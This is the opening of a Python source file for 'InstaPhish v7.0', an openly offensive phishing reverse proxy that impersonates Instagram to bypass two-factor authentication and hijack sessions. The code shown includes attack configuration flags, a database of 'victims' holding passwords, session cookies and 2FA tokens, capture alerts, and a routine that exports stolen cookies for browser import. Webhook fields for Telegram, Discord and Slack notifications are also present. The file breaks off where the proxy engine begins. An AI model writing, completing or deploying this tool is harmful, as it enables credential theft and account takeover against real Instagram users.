#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                    InstaPhish v7.0 - NEMESIS REVERSE PROXY ENGINE                      ║
║         Evilginx2 + Modlishka + Muraena Hybrid Cookie Interception Framework           ⑑
║              Full Session Hijacking | 2FA Bypass | Real-Time Exfiltration              ║
║                    Port: 4040 | Admin: 5000 | Target: Instagram                        ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
"""

import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, hmac
import random, string, http.server, socketserver, subprocess, shutil, socket
import urllib.request, urllib.error, urllib.parse, http.cookiejar, tempfile
import textwrap, ipaddress, signal, atexit, traceback, uuid, hashlib, binascii
import gzip, zlib, io, struct, copy, queue, collections, functools, operator
import email.parser, email.message, logging, html, xml.etree.ElementTree as ET
from pathlib import Path
from datetime import datetime, timedelta, timezone
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote, urlunparse, urljoin
from io import BytesIO, StringIO
from http.cookies import SimpleCookie, Morsel
from collections import OrderedDict, defaultdict, deque, namedtuple, Counter
from http import HTTPStatus, HTTPMethod
from email.parser import BytesParser, Parser
from email.policy import default as default_policy
from functools import lru_cache, wraps
from contextlib import contextmanager, suppress
from typing import Any, Dict, List, Tuple, Optional, Union, Callable
import cgi
import mimetypes

# ===================================================================================
# CONFIGURATION SYSTEM
# ===================================================================================

class ConfigManager:
    """Advanced configuration management with validation and hot-reload"""
    
    _instance = None
    _config = {}
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._load_defaults()
        self._load_from_env()
        self._validate()
    
    def _load_defaults(self):
        """Load default configuration"""
        self._config = {
            # Server Settings
            'LISTEN_HOST': '0.0.0.0',
            'LISTEN_PORT': 4040,
            'ADMIN_PORT': 5000,
            'MAX_WORKERS': 50,
            'REQUEST_TIMEOUT': 30,
            'KEEP_ALIVE_TIMEOUT': 5,
            
            # SSL/TLS Settings
            'SSL_CERT': 'certs/instagram.crt',
            'SSL_KEY': 'certs/instagram.key',
            'SSL_VERSION': 'TLSv1_2',
            'SSL_CIPHERS': 'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:!aNULL:!MD5',
            
            # Target Settings
            'TARGET_HOST': 'www.instagram.com',
            'TARGET_PORT': 443,
            'TARGET_USE_HTTP2': False,
            
            # Proxy Settings
            'STRIP_SECURITY_HEADERS': True,
            'INJECT_COOKIE_HOOKS': True,
            'BYPASS_CSP': True,
            'SPOOF_HSTS': True,
            'BLOCK_FAVICON': True,
            'ANTI_BOT_DETECTION': True,
            'SESSION_PERSISTENCE': True,
            'AUTO_REDIRECT': True,
            'REWRITE_URLS': True,
            'STRIP_CONTENT_ENCODING': True,
            
            # Attack Settings
            'CAPTURE_CREDENTIALS': True,
            'CAPTURE_COOKIES': True,
            'CAPTURE_2FA_TOKENS': True,
            'INTERCEPT_LOGIN': True,
            'INTERCEPT_SET_COOKIE': True,
            'INTERCEPT_AUTH_HEADERS': True,
            'LOG_REQUEST_BODIES': True,
            'LOG_RESPONSE_HEADERS': True,
            
            # Database Settings
            'DB_FILE': 'victims.db',
            'DB_BACKUP_INTERVAL': 300,
            'DB_MAX_ROWS': 100000,
            
            # Logging Settings
            'LOG_FILE': 'logs/credentials.txt',
            'COOKIE_FILE': 'logs/cookies.txt',
            'SESSION_FILE': 'logs/sessions.json',
            'FULL_LOG_FILE': 'logs/full_traffic.log',
            'ERROR_LOG_FILE': 'logs/errors.log',
            'LOG_LEVEL': 'INFO',
            
            # Evasion Settings
            'RANDOMIZE_USER_AGENT': True,
            'ROTATE_USER_AGENT_INTERVAL': 300,
            'SIMULATE_HUMAN_BEHAVIOR': True,
            'ADD_RANDOM_DELAYS': True,
            'DELAY_MIN': 0.1,
            'DELAY_MAX': 1.5,
            
            # Notification Settings
            'TELEGRAM_BOT_TOKEN': '',
            'TELEGRAM_CHAT_ID': '',
            'DISCORD_WEBHOOK': '',
            'SLACK_WEBHOOK': '',
            'ENABLE_NOTIFICATIONS': False,
            
            # Feature Flags
            'ENABLE_WEBSOCKET': False,
            'ENABLE_API': True,
            'ENABLE_REVERSE_PROXY': True,
            'ENABLE_PHISHING_PAGE': True,
            'ENABLE_ADMIN_PANEL': True,
            'ENABLE_DATA_EXPORT': True,
            
            # Debug Settings
            'DEBUG': False,
            'VERBOSE': True,
            'SAVE_TRAFFIC_DUMPS': False,
            'TRAFFIC_DUMP_DIR': 'traffic_dumps',
        }
    
    def _load_from_env(self):
        """Load configuration from environment variables"""
        env_prefix = 'INSTAPHISH_'
        for key in self._config:
            env_key = env_prefix + key
            if env_key in os.environ:
                env_value = os.environ[env_key]
                # Type conversion
                if isinstance(self._config[key], bool):
                    self._config[key] = env_value.lower() in ('true', '1', 'yes')
                elif isinstance(self._config[key], int):
                    self._config[key] = int(env_value)
                elif isinstance(self._config[key], float):
                    self._config[key] = float(env_value)
                elif isinstance(self._config[key], list):
                    self._config[key] = env_value.split(',')
                else:
                    self._config[key] = env_value
    
    def _validate(self):
        """Validate configuration values"""
        validations = {
            'LISTEN_PORT': lambda v: 1 <= v <= 65535,
            'ADMIN_PORT': lambda v: 1 <= v <= 65535,
            'MAX_WORKERS': lambda v: v > 0,
            'REQUEST_TIMEOUT': lambda v: v > 0,
        }
        for key, validator in validations.items():
            if key in self._config:
                if not validator(self._config[key]):
                    raise ValueError(f"Invalid configuration value for {key}: {self._config[key]}")
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value"""
        return self._config.get(key, default)
    
    def set(self, key: str, value: Any) -> None:
        """Set configuration value"""
        self._config[key] = value
    
    def get_all(self) -> Dict:
        """Get all configuration"""
        return self._config.copy()
    
    def __getattr__(self, name: str) -> Any:
        """Allow attribute-style access for uppercase config keys"""
        if name.isupper() and name in self._config:
            return self._config[name]
        raise AttributeError(f"'ConfigManager' has no attribute '{name}'")

# Global config instance
CONFIG = ConfigManager()

# ===================================================================================
# COLOR SYSTEM
# ===================================================================================

class AnsiColors:
    """Comprehensive ANSI color and style system"""
    
    # Basic colors
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    GRAY = '\033[90m'
    
    # Bright colors
    BRIGHT_RED = '\033[91m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    BRIGHT_BLUE = '\033[94m'
    BRIGHT_MAGENTA = '\033[95m'
    BRIGHT_CYAN = '\033[96m'
    BRIGHT_WHITE = '\033[97m'
    
    # Background colors
    BG_BLACK = '\033[40m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'
    BG_BRIGHT_RED = '\033[101m'
    BG_BRIGHT_GREEN = '\033[102m'
    BG_BRIGHT_YELLOW = '\033[103m'
    BG_BRIGHT_BLUE = '\033[104m'
    
    # Styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    
    # Reset
    RESET = '\033[0m'
    
    @classmethod
    def colorize(cls, text: str, color: str, style: str = '') -> str:
        """Apply color and style to text"""
        return f"{style}{color}{text}{cls.RESET}"
    
    @classmethod
    def gradient(cls, text: str, start_color: str, end_color: str) -> str:
        """Create gradient effect (works best with RGB-supporting terminals)"""
        # For basic terminals, just use the start color
        return f"{start_color}{text}{cls.RESET}"
    
    @classmethod
    def rainbow(cls, text: str) -> str:
        """Rainbow color effect"""
        colors = [cls.RED, cls.YELLOW, cls.GREEN, cls.CYAN, cls.BLUE, cls.MAGENTA]
        return ''.join(f"{colors[i % len(colors)]}{c}" for i, c in enumerate(text)) + cls.RESET

# ===================================================================================
# LOGGING SYSTEM
# ===================================================================================

class AdvancedLogger:
    """Multi-target logging system with rotation and formatting"""
    
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        self._setup_logger()
    
    def _setup_logger(self):
        """Setup Python logger"""
        self.logger = logging.getLogger('InstaPhish')
        self.logger.setLevel(logging.DEBUG if CONFIG.DEBUG else logging.INFO)
        
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(logging.INFO)
        console_format = logging.Formatter(
            f'{AnsiColors.CYAN}[%(asctime)s]{AnsiColors.RESET} '
            f'%(message)s',
            datefmt='%H:%M:%S'
        )
        console_handler.setFormatter(console_format)
        self.logger.addHandler(console_handler)
        
        # File handler
        if CONFIG.get('ERROR_LOG_FILE'):
            Path(os.path.dirname(CONFIG.ERROR_LOG_FILE)).mkdir(parents=True, exist_ok=True)
            file_handler = logging.FileHandler(CONFIG.ERROR_LOG_FILE)
            file_handler.setLevel(logging.WARNING)
            file_format = logging.Formatter(
                '[%(asctime)s] %(levelname)s: %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            file_handler.setFormatter(file_format)
            self.logger.addHandler(file_handler)
    
    def info(self, msg: str):
        self.logger.info(msg)
    
    def warning(self, msg: str):
        self.logger.warning(f"{AnsiColors.YELLOW}{msg}{AnsiColors.RESET}")
    
    def error(self, msg: str):
        self.logger.error(f"{AnsiColors.RED}{msg}{AnsiColors.RESET}")
    
    def success(self, msg: str):
        self.logger.info(f"{AnsiColors.GREEN}{msg}{AnsiColors.RESET}")
    
    def debug(self, msg: str):
        if CONFIG.DEBUG:
            self.logger.debug(f"{AnsiColors.GRAY}{msg}{AnsiColors.RESET}")

logger = AdvancedLogger()

# ===================================================================================
# BANNER SYSTEM
# ===================================================================================

class Banner:
    """Advanced banner display system"""
    
    @staticmethod
    def display_startup():
        """Display the main startup banner"""
        banner = f"""
{AnsiColors.BG_RED}{AnsiColors.WHITE}{AnsiColors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════╗
║  ██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗   ║
║  ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║   ║
║  ██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝███████║██║███████╗███████║   ║
║  ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║   ║
║  ██║██║ ╚████║███████║   ██║   ██║  ██║██║     ██║  ██║██║███████║██║  ██║   ║
║  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝   ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{AnsiColors.RESET}
{AnsiColors.BRIGHT_MAGENTA}{AnsiColors.BOLD}                          NEMESIS REVERSE PROXY v7.0
{AnsiColors.CYAN}         Evilginx2 × Modlishka × Muraena Hybrid Framework
{AnsiColors.GREEN}     HTTPS:{AnsiColors.WHITE} {CONFIG.LISTEN_PORT} {AnsiColors.GREEN}| Admin:{AnsiColors.WHITE} {CONFIG.ADMIN_PORT} {AnsiColors.GREEN}| Target:{AnsiColors.WHITE} {CONFIG.TARGET_HOST}
{AnsiColors.YELLOW}            Full Session Hijacking | 2FA Bypass | Real-Time
{AnsiColors.RESET}
"""
        print(banner)
    
    @staticmethod
    def display_capture_alert(alert_type: str, data: Dict):
        """Display capture alerts with formatting"""
        if alert_type == 'credentials':
            print(f"\n{AnsiColors.BG_RED}{AnsiColors.WHITE}{AnsiColors.BOLD} ⚡ CREDENTIALS CAPTURED ⚡ {AnsiColors.RESET}")
            print(f"  {AnsiColors.RED}├─ IP:{AnsiColors.RESET}      {AnsiColors.WHITE}{data.get('ip', 'Unknown')}{AnsiColors.RESET}")
            print(f"  {AnsiColors.RED}├─ Username:{AnsiColors.RESET} {AnsiColors.GREEN}{data.get('username', 'N/A')}{AnsiColors.RESET}")
            print(f"  {AnsiColors.RED}├─ Password:{AnsiColors.RESET} {AnsiColors.GREEN}{data.get('password', 'N/A')}{AnsiColors.RESET}")
            if data.get('email'):
                print(f"  {AnsiColors.RED}├─ Email:{AnsiColors.RESET}    {AnsiColors.WHITE}{data['email']}{AnsiColors.RESET}")
            print(f"  {AnsiColors.RED}└─ Method:{AnsiColors.RESET}   {AnsiColors.CYAN}{data.get('capture_method', 'unknown')}{AnsiColors.RESET}")
            print()
        elif alert_type == 'cookies':
            print(f"\n{AnsiColors.BG_YELLOW}{AnsiColors.BLACK}{AnsiColors.BOLD} 🍪 SESSION HIJACKED 🍪 {AnsiColors.RESET}")
            print(f"  {AnsiColors.YELLOW}├─ IP:{AnsiColors.RESET}         {AnsiColors.WHITE}{data.get('ip', 'Unknown')}{AnsiColors.RESET}")
            if data.get('sessionid'):
                print(f"  {AnsiColors.YELLOW}├─ SESSIONID:{AnsiColors.RESET}  {AnsiColors.MAGENTA}{data['sessionid'][:50]}...{AnsiColors.RESET}")
            if data.get('csrftoken'):
                print(f"  {AnsiColors.YELLOW}├─ CSRF:{AnsiColors.RESET}       {AnsiColors.WHITE}{data['csrftoken'][:30]}...{AnsiColors.RESET}")
            if data.get('ds_user_id'):
                print(f"  {AnsiColors.YELLOW}└─ USER ID:{AnsiColors.RESET}    {AnsiColors.WHITE}{data['ds_user_id']}{AnsiColors.RESET}")
            print()
        elif alert_type == '2fa':
            print(f"\n{AnsiColors.BG_MAGENTA}{AnsiColors.WHITE}{AnsiColors.BOLD} 🔐 2FA TOKEN CAPTURED 🔐 {AnsiColors.RESET}")
            print(f"  {AnsiColors.MAGENTA}├─ Token:{AnsiColors.RESET} {AnsiColors.WHITE}{data.get('token', 'Unknown')}{AnsiColors.RESET}")
            print()

# ===================================================================================
# DATABASE SYSTEM
# ===================================================================================

class DatabaseManager:
    """Advanced SQLite database management with connection pooling"""
    
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self.db_file = CONFIG.DB_FILE
        self.lock = threading.RLock()
        self._connection_pool = queue.Queue(maxsize=10)
        self._init_database()
    
    @contextmanager
    def _get_connection(self):
        """Get a database connection from pool or create new"""
        conn = None
        try:
            conn = self._connection_pool.get_nowait()
        except queue.Empty:
            conn = sqlite3.connect(self.db_file, check_same_thread=False)
            conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA foreign_keys=ON")
            conn.execute("PRAGMA busy_timeout=5000")
            conn.row_factory = sqlite3.Row
        
        try:
            yield conn
        finally:
            if conn:
                try:
                    if not conn.in_transaction:
                        self._connection_pool.put_nowait(conn)
                    else:
                        conn.close()
                except queue.Full:
                    conn.close()
    
    def _init_database(self):
        """Initialize database schema"""
        with self.lock:
            conn = sqlite3.connect(self.db_file)
            c = conn.cursor()
            
            # Enable WAL mode for better concurrent access
            c.execute("PRAGMA journal_mode=WAL")
            c.execute("PRAGMA foreign_keys=ON")
            
            # Victims table
            c.execute('''CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL DEFAULT (datetime('now')),
                ip_address TEXT,
                user_agent TEXT,
                username TEXT,
                password TEXT,
                email TEXT,
                phone TEXT,
                full_name TEXT,
                bio TEXT,
                follower_count INTEGER,
                following_count INTEGER,
                post_count INTEGER,
                account_type TEXT,
                sessionid TEXT,
                csrftoken TEXT,
                ds_user_id TEXT,
                rur TEXT,
                mid TEXT,
                ig_did TEXT,
                datr TEXT,
                shbid TEXT,
                shbts TEXT,
                ig_nrcb TEXT,
                target_url TEXT,
                referer TEXT,
                capture_method TEXT DEFAULT 'unknown',
                all_cookies TEXT,
                is_valid INTEGER DEFAULT 1,
                is_verified INTEGER DEFAULT 0,
                validation_count INTEGER DEFAULT 0,
                last_validated TEXT,
                geo_location TEXT,
                device_info TEXT,
                notes TEXT
            )''')
            
            # Active sessions table
            c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER,
                sessionid TEXT NOT NULL,
                csrftoken TEXT,
                ds_user_id TEXT,
                rur TEXT,
                mid TEXT,
                ig_did TEXT,
                datr TEXT,
                all_cookies TEXT,
                captured_at TEXT DEFAULT (datetime('now')),
                last_validated TEXT,
                is_active INTEGER DEFAULT 1,
                validation_count INTEGER DEFAULT 0,
                proxy_used TEXT,
                expiry_estimated TEXT,
                FOREIGN KEY(victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )''')
            
            # Attack log table
            c.execute('''CREATE TABLE IF NOT EXISTS attack_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT DEFAULT (datetime('now')),
                attack_type TEXT,
                target_ip TEXT,
                user_agent TEXT,
                request_method TEXT,
                request_path TEXT,
                request_headers TEXT,
                request_body TEXT,
                response_code INTEGER,
                response_headers TEXT,
                cookies_captured INTEGER DEFAULT 0,
                credentials_captured INTEGER DEFAULT 0,
                success INTEGER DEFAULT 0,
                duration_ms REAL,
                details TEXT
            )''')
            
            # 2FA tokens table
            c.execute('''CREATE TABLE IF NOT EXISTS twofa_tokens (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER,
                token_type TEXT,
                token_value TEXT,
                captured_at TEXT DEFAULT (datetime('now')),
                is_used INTEGER DEFAULT 0,
                used_at TEXT,
                FOREIGN KEY(victim_id) REFERENCES victims(id) ON DELETE CASCADE
            )''')
            
            # Proxy config table
            c.execute('''CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT UNIQUE,
                value TEXT,
                updated_at TEXT DEFAULT (datetime('now'))
            )''')
            
            # Create indices
            indices = [
                'CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)',
                'CREATE INDEX IF NOT EXISTS idx_victims_ip ON victims(ip_address)',
                'CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)',
                'CREATE INDEX IF NOT EXISTS idx_victims_sessionid ON victims(sessionid)',
                'CREATE INDEX IF NOT EXISTS idx_victims_email ON victims(email)',
                'CREATE INDEX IF NOT EXISTS idx_sessions_sessionid ON active_sessions(sessionid)',
                'CREATE INDEX IF NOT EXISTS idx_sessions_active ON active_sessions(is_active)',
                'CREATE INDEX IF NOT EXISTS idx_attack_timestamp ON attack_log(timestamp)',
                'CREATE INDEX IF NOT EXISTS idx_attack_type ON attack_log(attack_type)',
                'CREATE INDEX IF NOT EXISTS idx_attack_ip ON attack_log(target_ip)',
                'CREATE INDEX IF NOT EXISTS idx_2fa_victim ON twofa_tokens(victim_id)',
            ]
            for idx in indices:
                c.execute(idx)
            
            conn.commit()
            conn.close()
    
    def store_victim(self, data: Dict) -> Optional[int]:
        """Store victim data in database"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    
                    c.execute('''INSERT INTO victims (
                        timestamp, ip_address, user_agent, username, password,
                        email, phone, sessionid, csrftoken, ds_user_id,
                        rur, mid, ig_did, datr, shbid, shbts,
                        target_url, referer, capture_method, all_cookies
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
                        data.get('timestamp', datetime.now().isoformat()),
                        data.get('ip', ''),
                        data.get('user_agent', ''),
                        data.get('username', ''),
                        data.get('password', ''),
                        data.get('email', ''),
                        data.get('phone', ''),
                        data.get('sessionid', ''),
                        data.get('csrftoken', ''),
                        data.get('ds_user_id', ''),
                        data.get('rur', ''),
                        data.get('mid', ''),
                        data.get('ig_did', ''),
                        data.get('datr', ''),
                        data.get('shbid', ''),
                        data.get('shbts', ''),
                        data.get('target_url', ''),
                        data.get('referer', ''),
                        data.get('capture_method', 'unknown'),
                        data.get('all_cookies', '')
                    ))
                    
                    victim_id = c.lastrowid
                    
                    # Store active session if cookies captured
                    if data.get('sessionid'):
                        c.execute('''INSERT INTO active_sessions (
                            victim_id, sessionid, csrftoken, ds_user_id,
                            rur, mid, ig_did, all_cookies, captured_at, is_active
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)''', (
                            victim_id,
                            data.get('sessionid', ''),
                            data.get('csrftoken', ''),
                            data.get('ds_user_id', ''),
                            data.get('rur', ''),
                            data.get('mid', ''),
                            data.get('ig_did', ''),
                            data.get('all_cookies', ''),
                            datetime.now().isoformat()
                        ))
                    
                    conn.commit()
                    return victim_id
                    
            except Exception as e:
                logger.error(f"Database store_victim error: {e}")
                return None
    
    def store_2fa_token(self, victim_id: int, token: str, token_type: str = 'totp'):
        """Store captured 2FA token"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    c.execute('''INSERT INTO twofa_tokens (victim_id, token_type, token_value, captured_at)
                                VALUES (?, ?, ?, ?)''', 
                             (victim_id, token_type, token, datetime.now().isoformat()))
                    conn.commit()
            except Exception as e:
                logger.error(f"Database store_2fa_token error: {e}")
    
    def log_attack(self, data: Dict):
        """Log attack attempt"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    c.execute('''INSERT INTO attack_log (
                        attack_type, target_ip, user_agent, request_method,
                        request_path, request_body, response_code,
                        cookies_captured, credentials_captured, success, details
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
                        data.get('type', 'unknown'),
                        data.get('ip', ''),
                        data.get('user_agent', ''),
                        data.get('method', 'GET'),
                        data.get('path', '/'),
                        data.get('body', ''),
                        data.get('response_code', 0),
                        data.get('cookies_captured', 0),
                        data.get('credentials_captured', 0),
                        data.get('success', 0),
                        data.get('details', '')
                    ))
                    conn.commit()
            except Exception as e:
                logger.error(f"Database log_attack error: {e}")
    
    def get_victims(self, limit: int = 200, offset: int = 0, filters: Dict = None) -> List[Dict]:
        """Get victim records with optional filtering"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    query = 'SELECT * FROM victims'
                    params = []
                    
                    if filters:
                        conditions = []
                        for key, value in filters.items():
                            if value is not None:
                                conditions.append(f"{key} LIKE ?")
                                params.append(f"%{value}%")
                        if conditions:
                            query += ' WHERE ' + ' AND '.join(conditions)
                    
                    query += ' ORDER BY id DESC LIMIT ? OFFSET ?'
                    params.extend([limit, offset])
                    
                    c = conn.cursor()
                    c.execute(query, params)
                    
                    victims = []
                    columns = [desc[0] for desc in c.description]
                    for row in c.fetchall():
                        victims.append(dict(zip(columns, row)))
                    
                    return victims
            except Exception as e:
                logger.error(f"Database get_victims error: {e}")
                return []
    
    def get_active_sessions(self, limit: int = 100) -> List[Dict]:
        """Get active hijacked sessions"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    c.execute('''SELECT s.*, v.username, v.ip_address 
                                FROM active_sessions s 
                                LEFT JOIN victims v ON s.victim_id = v.id 
                                WHERE s.is_active = 1 
                                ORDER BY s.id DESC LIMIT ?''', (limit,))
                    
                    sessions = []
                    columns = [desc[0] for desc in c.description]
                    for row in c.fetchall():
                        sessions.append(dict(zip(columns, row)))
                    
                    return sessions
            except Exception as e:
                logger.error(f"Database get_active_sessions error: {e}")
                return []
    
    def get_stats(self) -> Dict:
        """Get comprehensive statistics"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    
                    stats = {}
                    
                    c.execute('SELECT COUNT(*) FROM victims')
                    stats['total'] = c.fetchone()[0]
                    
                    today = datetime.now().strftime('%Y-%m-%d')
                    c.execute("SELECT COUNT(*) FROM victims WHERE timestamp LIKE ?", (f"{today}%",))
                    stats['today'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM victims WHERE sessionid IS NOT NULL AND sessionid != ''")
                    stats['with_cookies'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM active_sessions WHERE is_active=1")
                    stats['active_sessions'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM victims WHERE username IS NOT NULL AND username != ''")
                    stats['with_credentials'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(DISTINCT ip_address) FROM victims")
                    stats['unique_ips'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM twofa_tokens")
                    stats['2fa_captured'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM victims WHERE timestamp > datetime('now','-1 hour')")
                    stats['last_hour'] = c.fetchone()[0]
                    
                    c.execute("SELECT COUNT(*) FROM victims WHERE timestamp > datetime('now','-24 hours')")
                    stats['last_24h'] = c.fetchone()[0]
                    
                    c.execute("SELECT capture_method, COUNT(*) as cnt FROM victims GROUP BY capture_method ORDER BY cnt DESC LIMIT 10")
                    stats['methods'] = {row[0]: row[1] for row in c.fetchall()}
                    
                    return stats
                    
            except Exception as e:
                logger.error(f"Database get_stats error: {e}")
                return {}
    
    def delete_victim(self, victim_id: int) -> bool:
        """Delete a victim record"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    c.execute('DELETE FROM victims WHERE id=?', (victim_id,))
                    c.execute('DELETE FROM active_sessions WHERE victim_id=?', (victim_id,))
                    c.execute('DELETE FROM twofa_tokens WHERE victim_id=?', (victim_id,))
                    conn.commit()
                    return True
            except Exception as e:
                logger.error(f"Database delete_victim error: {e}")
                return False
    
    def clear_all(self) -> bool:
        """Clear all records"""
        with self.lock:
            try:
                with self._get_connection() as conn:
                    c = conn.cursor()
                    c.execute('DELETE FROM victims')
                    c.execute('DELETE FROM active_sessions')
                    c.execute('DELETE FROM twofa_tokens')
                    c.execute('DELETE FROM attack_log')
                    conn.commit()
                    return True
            except Exception as e:
                logger.error(f"Database clear_all error: {e}")
                return False
    
    def backup(self) -> Optional[str]:
        """Create database backup"""
        try:
            backup_dir = "backups"
            os.makedirs(backup_dir, exist_ok=True)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_name = f"{backup_dir}/victims_backup_{timestamp}.db"
            
            with self.lock:
                source = sqlite3.connect(self.db_file)
                dest = sqlite3.connect(backup_name)
                source.backup(dest)
                source.close()
                dest.close()
            
            return backup_name
        except Exception as e:
            logger.error(f"Database backup error: {e}")
            return None

# ===================================================================================
# COOKIE PARSER
# ===================================================================================

class CookieEngine:
    """Advanced cookie parsing, management, and validation"""
    
    IMPORTANT_COOKIE_KEYS = [
        'sessionid', 'csrftoken', 'ds_user_id', 'ds_user',
        'rur', 'mid', 'ig_did', 'ig_nrcb', 'datr',
        'shbid', 'shbts', 'session', 'x-csrftoken',
        'target', 'fbsr_', 'wd', 'fr', 'xs', 'c_user',
        'oo', 'presence'
    ]
    
    @staticmethod
    def parse_cookie_string(cookie_string: str) -> OrderedDict:
        """Parse cookie string into OrderedDict"""
        cookies = OrderedDict()
        if not cookie_string:
            return cookies
        
        for item in cookie_string.split(';'):
            item = item.strip()
            if '=' in item:
                key, _, value = item.partition('=')
                key = key.strip()
                value = value.strip()
                if key:
                    cookies[key] = value
        
        return cookies
    
    @staticmethod
    def parse_set_cookie_headers(set_cookie_headers: Union[str, List[str]]) -> OrderedDict:
        """Parse Set-Cookie headers and extract important Instagram cookies"""
        important = OrderedDict()
        
        if not set_cookie_headers:
            return important
        
        if isinstance(set_cookie_headers, str):
            set_cookie_headers = [set_cookie_headers]
        
        for header in set_cookie_headers:
            if not header:
                continue
            
            try:
                cookie = SimpleCookie()
                cookie.load(header)
                
                for key, morsel in cookie.items():
                    key_lower = key.lower()
                    if key_lower in CookieEngine.IMPORTANT_COOKIE_KEYS:
                        important[key_lower] = morsel.value
                    elif 'session' in key_lower or 'auth' in key_lower or 'token' in key_lower:
                        important[key_lower] = morsel.value
                        
            except Exception:
                try:
                    parts = header.split(';')[0].strip()
                    if '=' in parts:
                        key, value = parts.split('=', 1)
                        key_lower = key.strip().lower()
                        if key_lower in CookieEngine.IMPORTANT_COOKIE_KEYS:
                            important[key_lower] = value.strip()
                except:
                    pass
        
        return important
    
    @staticmethod
    def cookies_to_string(cookies: Union[Dict, OrderedDict]) -> str:
        """Convert cookie dict to string"""
        if not cookies:
            return ""
        return "; ".join(f"{k}={v}" for k, v in cookies.items())
    
    @staticmethod
    def cookies_to_json_import(cookies: Union[Dict, OrderedDict]) -> str:
        """Convert cookies to EditThisCookie importable JSON"""
        import_data = []
        for key, value in cookies.items():
            import_data.append({
                "domain": ".instagram.com",
                "hostOnly": False,
                "httpOnly": key in ['sessionid', 'csrftoken', 'ds_user_id'],
                "name": key,
                "path": "/",
                "sameSite": "unspecified",
                "secure": True,
                "session": True,
                "storeId": "0",
                "value": value,
                "id": random.randint(1, 999999)
            })
        return json.dumps(import_data, indent=2)
    
    @staticmethod
    def validate_session(cookies: Dict) -> bool:
        """Check if cookies contain a valid Instagram session"""
        required_keys = ['sessionid', 'ds_user_id']
        return all(key in cookies and cookies[key] for key in required_keys)

# ===================================================================================
# REVERSE PROXY ENGINE (Evilginx2 + Modlishka Hybrid)
# ===================================================================================

class ReverseProxyCore:
    """
    Advanced reverse proxy engine combining techniques from:
    - Evilginx2 (Set-Cookie interception, header stripping)
    - Modlishka (transparent reverse proxy, URL rewriting)
    - Muraena (session persistence, 2FA handling)
    """
    
    def __init__(self):
